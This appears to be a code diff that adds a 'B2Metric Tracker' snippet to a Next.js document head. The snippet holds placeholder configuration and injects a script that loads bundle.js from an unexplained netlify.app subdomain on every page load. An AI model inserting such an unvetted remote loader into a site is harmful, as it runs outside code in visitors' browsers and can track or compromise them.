@@ -23,6 +23,22 @@ class CustomDocument extends Document {
           <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
           <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
           <meta name="theme-color" content="#111827" />
+          
+    <!-- B2Metric Tracker Installation -->
+    <script>
+    (function(w,d,s,i){
+        w.B2M_TRACKER_CONFIG = {
+            company_id: '123',
+            company_app_name: 'their_app',
+            task_id: 'TRACKING_123'
+        };
+        var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s);
+        j.async=true;
+        j.src='https://quiet-arithmetic-47d159.netlify.app/bundle.js';
+        f.parentNode.insertBefore(j,f);
+    })(window,document,'script');
+    </script>
         </Head>
         <body>
           <Main />
